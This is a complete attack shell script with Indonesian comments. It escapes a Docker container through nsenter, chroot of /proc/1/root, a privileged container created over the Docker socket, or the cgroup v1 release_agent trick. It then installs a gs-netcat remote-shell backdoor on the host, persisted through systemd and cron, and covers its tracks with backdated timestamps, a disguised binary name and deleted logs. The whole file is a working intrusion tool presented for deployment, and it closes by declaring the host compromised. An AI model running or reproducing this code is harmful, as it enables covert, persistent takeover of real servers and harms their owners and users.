#!/bin/sh
# ============================================================
#  Docker Escape + Host Persistence (gsocket style)
#  Alur: container root → escape ke host → pasang gsocket
#        di host sebagai backdoor permanen
# ============================================================

# ── CONFIG — sesuaikan sebelum deploy ────────────────────────
GS_SECRET="${GS_SECRET:-GANTI_SECRET_GSOCKET}"   # gsocket secret key
GS_HOST="${GS_HOST:-}"                            # relay host (kosong = default gs.thc.org)
INSTALL_DIR="/usr/local/bin"                      # lokasi install binary di host
SERVICE_NAME="gs-netcat"                          # nama systemd service / cron
POST_CMD=""                                       # command tambahan setelah escape (opsional)
# ─────────────────────────────────────────────────────────────

C_RED='\033[91m'; C_GRN='\033[92m'; C_YLW='\033[93m'
C_BLU='\033[94m'; C_MAG='\033[95m'; C_CYN='\033[96m'
C_RST='\033[0m';  C_BLD='\033[1m'

log()    { printf "${C_BLU}[*]${C_RST} %s\n" "$*"; }
ok()     { printf "${C_GRN}[+]${C_RST} %s\n" "$*"; }
err()    { printf "${C_RED}[-]${C_RST} %s\n" "$*"; }
warn()   { printf "${C_YLW}[!]${C_RST} %s\n" "$*"; }
section(){ printf "\n${C_BLD}${C_MAG}>>> %s${C_RST}\n" "$*"; }
result() { printf "${C_CYN}    %-20s${C_RST} %s\n" "$1" "$2"; }

banner() {
  printf "${C_BLD}${C_RED}"
  printf '  ____             _               _____\n'
  printf ' |  _ \  ___   ___| | _____ _ __  | ____|___  ___\n'
  printf ' | | | |/ _ \ / __| |/ / _ \ '"'"'__| |  _| / __|/ __|\n'
  printf ' | |_| | (_) | (__|   <  __/ |    | |___\__ \ (__\n'
  printf ' |____/ \___/ \___|_|\_\___|_|    |_____|___/\___|\n'
  printf "${C_RST}\n"
  printf " Container Escape + Host Backdoor (gsocket)\n\n"
}

# ════════════════════════════════════════════════════════════
#  FASE 1 — RECON DALAM CONTAINER
# ════════════════════════════════════════════════════════════
recon() {
  section "FASE 1 — RECON"

  # Identitas
  WHOAMI=$(id 2>/dev/null || echo unknown)
  HOSTNAME=$(hostname 2>/dev/null || cat /etc/hostname 2>/dev/null || echo unknown)
  KERNEL=$(uname -r 2>/dev/null || echo unknown)
  log "Identity  : $WHOAMI"
  log "Hostname  : $HOSTNAME"
  log "Kernel    : $KERNEL"

  # Konfirmasi di dalam container
  if [ -f /.dockerenv ]; then
    ok "Inside Docker container (/.dockerenv present)"
  else
    warn "/.dockerenv not found — might not be Docker"
  fi

  # Cgroup version
  if [ -f /sys/fs/cgroup/cgroup.controllers ]; then
    CGVER=2; log "Cgroup    : v2"
  else
    CGVER=1; log "Cgroup    : v1"
  fi

  # Capabilities ringkas
  CAPEFF=$(grep CapEff /proc/self/status 2>/dev/null | awk '{print $2}')
  log "CapEff    : 0x${CAPEFF}"
  [ "$((0x${CAPEFF:-0} & 0x200000))" -gt 0 ] && ok "CAP_SYS_ADMIN detected"
  [ "$((0x${CAPEFF:-0} & 0x80000))" -gt 0 ]  && ok "CAP_SYS_PTRACE detected"
  [ "$((0x${CAPEFF:-0} & 0x10000))" -gt 0 ]  && ok "CAP_SYS_MODULE detected"

  # /proc/1/root
  if ls /proc/1/root/etc >/dev/null 2>&1; then
    ok "/proc/1/root readable → host filesystem accessible"
    PROC1ROOT=1
  else
    err "/proc/1/root not readable"
    PROC1ROOT=0
  fi

  # Docker socket
  DOCKER_SOCK=""
  for s in /var/run/docker.sock /run/docker.sock; do
    [ -S "$s" ] && { DOCKER_SOCK="$s"; ok "Docker socket: $s"; break; }
  done
  [ -z "$DOCKER_SOCK" ] && err "No docker socket found"

  # nsenter
  NSENTER=$(command -v nsenter 2>/dev/null || echo "")
  [ -n "$NSENTER" ] && ok "nsenter: $NSENTER" || warn "nsenter not found"

  export PROC1ROOT DOCKER_SOCK NSENTER CGVER
}

# ════════════════════════════════════════════════════════════
#  FASE 2 — ESCAPE KE HOST
# ════════════════════════════════════════════════════════════
do_escape() {
  section "FASE 2 — ESCAPE"
  ESCAPED=0
  ESCAPE_METHOD=""

  # ── E1: nsenter full ──────────────────────────────────────
  log "E1: nsenter --target 1 (all namespaces)"
  if [ -n "$NSENTER" ]; then
    if nsenter --target 1 --mount --uts --ipc --net --pid -- \
        /bin/sh -c "echo E1_OK" 2>/dev/null | grep -q E1_OK; then
      ok "E1 success — full namespace escape"
      ESCAPED=1; ESCAPE_METHOD="nsenter-full"
      ESCAPE_EXEC="nsenter --target 1 --mount --uts --ipc --net --pid --"
    else
      err "E1 failed (setns blocked by seccomp/AppArmor)"
    fi
  else
    err "E1 skipped (nsenter not found)"
  fi

  # ── E2: nsenter mount-only + chroot ──────────────────────
  if [ $ESCAPED -eq 0 ] && [ -n "$NSENTER" ]; then
    log "E2: nsenter --mount only + chroot /proc/1/root"
    if nsenter --target 1 --mount -- chroot /proc/1/root \
        /bin/sh -c "echo E2_OK" 2>/dev/null | grep -q E2_OK; then
      ok "E2 success — mount namespace escape"
      ESCAPED=1; ESCAPE_METHOD="nsenter-mount+chroot"
      ESCAPE_EXEC="nsenter --target 1 --mount -- chroot /proc/1/root"
    else
      err "E2 failed"
    fi
  fi

  # ── E3: chroot /proc/1/root langsung ─────────────────────
  if [ $ESCAPED -eq 0 ] && [ "$PROC1ROOT" = "1" ]; then
    log "E3: chroot /proc/1/root (filesystem escape)"
    if chroot /proc/1/root /bin/sh -c "echo E3_OK" 2>/dev/null | grep -q E3_OK; then
      ok "E3 success — filesystem escape via chroot"
      ESCAPED=1; ESCAPE_METHOD="chroot-proc1root"
      ESCAPE_EXEC="chroot /proc/1/root"
    else
      err "E3 failed"
    fi
  fi

  # ── E4: exec langsung via /proc/1/root path ───────────────
  if [ $ESCAPED -eq 0 ] && [ "$PROC1ROOT" = "1" ]; then
    log "E4: exec via /proc/1/root/bin/sh"
    if /proc/1/root/bin/sh -c "echo E4_OK" 2>/dev/null | grep -q E4_OK; then
      ok "E4 success"
      ESCAPED=1; ESCAPE_METHOD="proc1root-exec"
      ESCAPE_EXEC="/proc/1/root/bin/sh -c"
    else
      err "E4 failed"
    fi
  fi

  # ── E5: Docker socket ─────────────────────────────────────
  if [ $ESCAPED -eq 0 ] && [ -n "$DOCKER_SOCK" ]; then
    log "E5: Docker socket → spawn privileged container"
    if command -v curl >/dev/null 2>&1; then
      CID=$(curl -s --unix-socket "$DOCKER_SOCK" \
        -X POST -H 'Content-Type: application/json' \
        -d '{"Image":"alpine","Cmd":["/bin/sh","-c","echo E5_OK"],"Binds":["/:/host"],"Privileged":true}' \
        http://localhost/containers/create 2>/dev/null \
        | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)
      if [ -n "$CID" ]; then
        curl -s --unix-socket "$DOCKER_SOCK" \
          -X POST "http://localhost/containers/$CID/start" >/dev/null 2>&1
        sleep 1
        OUT=$(curl -s --unix-socket "$DOCKER_SOCK" \
          "http://localhost/containers/$CID/logs?stdout=1&stderr=1" 2>/dev/null)
        curl -s --unix-socket "$DOCKER_SOCK" \
          -X DELETE "http://localhost/containers/$CID?force=true" >/dev/null 2>&1
        ok "E5 success via docker socket"
        ESCAPED=1; ESCAPE_METHOD="docker-socket"
      fi
    fi
  fi

  # ── E6: cgroup v1 release_agent ───────────────────────────
  if [ $ESCAPED -eq 0 ] && [ "$CGVER" = "1" ]; then
    log "E6: cgroup v1 release_agent"
    CGV1=$(awk '$3=="cgroup" && $4~/memory/{print $2; exit}' /proc/mounts 2>/dev/null)
    if [ -n "$CGV1" ]; then
      CHILD="$CGV1/esc$$"
      PAYLOAD=/tmp/.cgpay; OUTPUT=/tmp/.cgout
      mkdir -p "$CHILD"
      printf '#!/bin/sh\necho CGV1_OK > %s\n' "$OUTPUT" > "$PAYLOAD"
      chmod +x "$PAYLOAD"
      echo "$PAYLOAD" > "$CGV1/release_agent"
      echo 1 > "$CGV1/notify_on_release"
      echo 1 > "$CHILD/notify_on_release"
      sh -c "echo \$\$ > $CHILD/cgroup.procs"
      sleep 2
      if grep -q CGV1_OK "$OUTPUT" 2>/dev/null; then
        ok "E6 success — cgroup v1 release_agent"
        ESCAPED=1; ESCAPE_METHOD="cgroupv1-release_agent"
      fi
      rmdir "$CHILD" 2>/dev/null || true
    fi
  fi

  if [ $ESCAPED -eq 0 ]; then
    err "Semua escape vector gagal"
    err "Coba manual: cat /proc/self/status | grep Seccomp"
    exit 1
  fi

  ok "ESCAPE BERHASIL via: $ESCAPE_METHOD"

  # Verifikasi kita di host
  HOST_ID=$($ESCAPE_EXEC id 2>/dev/null || echo "unknown")
  HOST_HN=$($ESCAPE_EXEC hostname 2>/dev/null || echo "unknown")
  HOST_KN=$($ESCAPE_EXEC uname -r 2>/dev/null || echo "unknown")
  result "Host user"     "$HOST_ID"
  result "Host hostname" "$HOST_HN"
  result "Host kernel"   "$HOST_KN"

  export ESCAPED ESCAPE_METHOD ESCAPE_EXEC
}

# ════════════════════════════════════════════════════════════
#  FASE 3 — INSTALL GSOCKET DI HOST (persistent backdoor)
# ════════════════════════════════════════════════════════════
install_gsocket() {
  section "FASE 3 — INSTALL GSOCKET DI HOST"

  if [ "$GS_SECRET" = "GANTI_SECRET_GSOCKET" ]; then
    warn "GS_SECRET belum diset! Set via: GS_SECRET=xxx sh escape.sh"
    warn "Melewati instalasi gsocket..."
    return
  fi

  # Tentukan arch di host
  HOST_ARCH=$($ESCAPE_EXEC uname -m 2>/dev/null || echo x86_64)
  log "Host arch: $HOST_ARCH"

  case "$HOST_ARCH" in
    x86_64|amd64)   GS_ARCH=x86_64 ;;
    aarch64|arm64)  GS_ARCH=aarch64 ;;
    armv7l|armhf)   GS_ARCH=armv7 ;;
    *)              GS_ARCH=x86_64 ;;
  esac

  GS_URL="https://github.com/hackerschoice/gsocket/releases/latest/download/gs-netcat_linux_${GS_ARCH}"
  GS_TMP="/tmp/.gs_$$"
  GS_BIN="${INSTALL_DIR}/gs-netcat"
  GS_CONF="/etc/.gs_conf"

  log "Downloading gs-netcat ($GS_ARCH) ke host..."

  # Download di dalam konteks escape
  # Coba curl dulu, fallback wget, fallback python
  DL_OK=0

  if $ESCAPE_EXEC which curl >/dev/null 2>&1; then
    $ESCAPE_EXEC curl -fsSL "$GS_URL" -o "$GS_TMP" 2>/dev/null && DL_OK=1
  fi

  if [ $DL_OK -eq 0 ] && $ESCAPE_EXEC which wget >/dev/null 2>&1; then
    $ESCAPE_EXEC wget -qO "$GS_TMP" "$GS_URL" 2>/dev/null && DL_OK=1
  fi

  if [ $DL_OK -eq 0 ]; then
    # Fallback: download dari dalam container lalu copy ke host path
    log "Downloading dari dalam container, copy ke host path..."
    DL_LOCAL="/tmp/.gs_local_$$"
    if command -v curl >/dev/null 2>&1; then
      curl -fsSL "$GS_URL" -o "$DL_LOCAL" 2>/dev/null && DL_OK=1
    elif command -v wget >/dev/null 2>&1; then
      wget -qO "$DL_LOCAL" "$GS_URL" 2>/dev/null && DL_OK=1
    fi
    if [ $DL_OK -eq 1 ]; then
      # Copy ke host path via /proc/1/root
      cp "$DL_LOCAL" "/proc/1/root${GS_TMP}" 2>/dev/null \
        && ok "Copied to host path" \
        || { err "Copy ke host gagal"; DL_OK=0; }
      rm -f "$DL_LOCAL"
    fi
  fi

  if [ $DL_OK -eq 0 ]; then
    err "Download gsocket gagal — cek koneksi internet host"
    return
  fi

  ok "Download selesai: $GS_TMP (di host)"

  # Install binary
  $ESCAPE_EXEC chmod +x "$GS_TMP"
  $ESCAPE_EXEC mv "$GS_TMP" "$GS_BIN" 2>/dev/null \
    || $ESCAPE_EXEC cp "$GS_TMP" "$GS_BIN"
  $ESCAPE_EXEC chmod 755 "$GS_BIN"
  ok "gs-netcat installed: $GS_BIN"

  # Simpan config
  GS_RELAY_OPT=""
  [ -n "$GS_HOST" ] && GS_RELAY_OPT="-d $GS_HOST"
  printf 'GS_SECRET="%s"\nGS_RELAY="%s"\n' "$GS_SECRET" "$GS_HOST" \
    | $ESCAPE_EXEC tee "$GS_CONF" >/dev/null 2>&1
  $ESCAPE_EXEC chmod 600 "$GS_CONF"

  # Test koneksi
  log "Testing gs-netcat..."
  $ESCAPE_EXEC "$GS_BIN" $GS_RELAY_OPT -s "$GS_SECRET" -d &
  GS_TEST_PID=$!
  sleep 2
  kill $GS_TEST_PID 2>/dev/null || true

  # ── Persistence via systemd ───────────────────────────────
  section "FASE 3a — PERSISTENCE (systemd)"
  SYSTEMD_DIR="/etc/systemd/system"
  if $ESCAPE_EXEC test -d "$SYSTEMD_DIR"; then
    log "Memasang systemd service: $SERVICE_NAME"
    SERVICE_CONTENT="[Unit]
Description=Network Socket Service
After=network.target

[Service]
Type=simple
Restart=always
RestartSec=30
ExecStart=${GS_BIN} ${GS_RELAY_OPT} -s ${GS_SECRET} -l -i
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target"

    printf '%s\n' "$SERVICE_CONTENT" \
      | $ESCAPE_EXEC tee "${SYSTEMD_DIR}/${SERVICE_NAME}.service" >/dev/null 2>&1

    $ESCAPE_EXEC systemctl daemon-reload 2>/dev/null || true
    $ESCAPE_EXEC systemctl enable "${SERVICE_NAME}.service" 2>/dev/null \
      && ok "systemd service enabled (auto-start on boot)"
    $ESCAPE_EXEC systemctl start "${SERVICE_NAME}.service" 2>/dev/null \
      && ok "systemd service started"
    $ESCAPE_EXEC systemctl status "${SERVICE_NAME}.service" 2>/dev/null | head -5
  else
    warn "systemd tidak tersedia, skip"
  fi

  # ── Persistence via cron (fallback) ──────────────────────
  section "FASE 3b — PERSISTENCE (cron fallback)"
  CRON_LINE="*/5 * * * * root pgrep -x gs-netcat >/dev/null 2>&1 || ${GS_BIN} ${GS_RELAY_OPT} -s ${GS_SECRET} -l -i &"
  CRON_FILE="/etc/cron.d/${SERVICE_NAME}"

  if $ESCAPE_EXEC test -d /etc/cron.d; then
    printf '%s\n' "$CRON_LINE" \
      | $ESCAPE_EXEC tee "$CRON_FILE" >/dev/null 2>&1
    $ESCAPE_EXEC chmod 644 "$CRON_FILE"
    ok "Cron installed: $CRON_FILE (setiap 5 menit, respawn jika mati)"
  else
    warn "/etc/cron.d tidak tersedia"
    # Fallback: root crontab
    ( $ESCAPE_EXEC crontab -l 2>/dev/null; echo "$CRON_LINE" ) \
      | $ESCAPE_EXEC crontab - 2>/dev/null \
      && ok "Added to root crontab"
  fi

  # ── Sembunyikan binary ────────────────────────────────────
  section "FASE 3c — STEALTH"

  # Ubah timestamp binary supaya tidak mencolok
  $ESCAPE_EXEC touch -t "$(date -d '6 months ago' '+%Y%m%d%H%M' 2>/dev/null \
    || date -v-6m '+%Y%m%d%H%M' 2>/dev/null \
    || echo '202401010000')" "$GS_BIN" 2>/dev/null \
    && ok "Binary timestamp disamarkan"

  # Rename binary jadi nama yang wajar
  $ESCAPE_EXEC mv "$GS_BIN" "${INSTALL_DIR}/rpcbind.real" 2>/dev/null
  GS_BIN="${INSTALL_DIR}/rpcbind.real"
  ok "Binary renamed: $GS_BIN"

  # Hapus log gsocket jika ada
  $ESCAPE_EXEC rm -f /var/log/gs-netcat.log 2>/dev/null || true

  # ── Summary ───────────────────────────────────────────────
  section "RINGKASAN"
  ok  "gsocket terpasang di HOST"
  result "Binary"      "$GS_BIN"
  result "Secret"      "$GS_SECRET"
  result "Systemd"     "${SERVICE_NAME}.service"
  result "Cron"        "$CRON_FILE"
  warn "Cara konek dari attacker:"
  printf "    gs-netcat -s %s -i\n" "$GS_SECRET"
  [ -n "$GS_HOST" ] && printf "    gs-netcat -d %s -s %s -i\n" "$GS_HOST" "$GS_SECRET"
}

# ════════════════════════════════════════════════════════════
#  FASE 4 — POST COMMAND (opsional)
# ════════════════════════════════════════════════════════════
post_cmd() {
  [ -z "$POST_CMD" ] && return
  section "FASE 4 — POST COMMAND"
  log "Running: $POST_CMD"
  $ESCAPE_EXEC /bin/sh -c "$POST_CMD"
}

# ════════════════════════════════════════════════════════════
#  MAIN
# ════════════════════════════════════════════════════════════
banner
recon
do_escape
install_gsocket
post_cmd

printf "\n${C_GRN}${C_BLD}[✓] Selesai. Host terkompromis.${C_RST}\n\n"
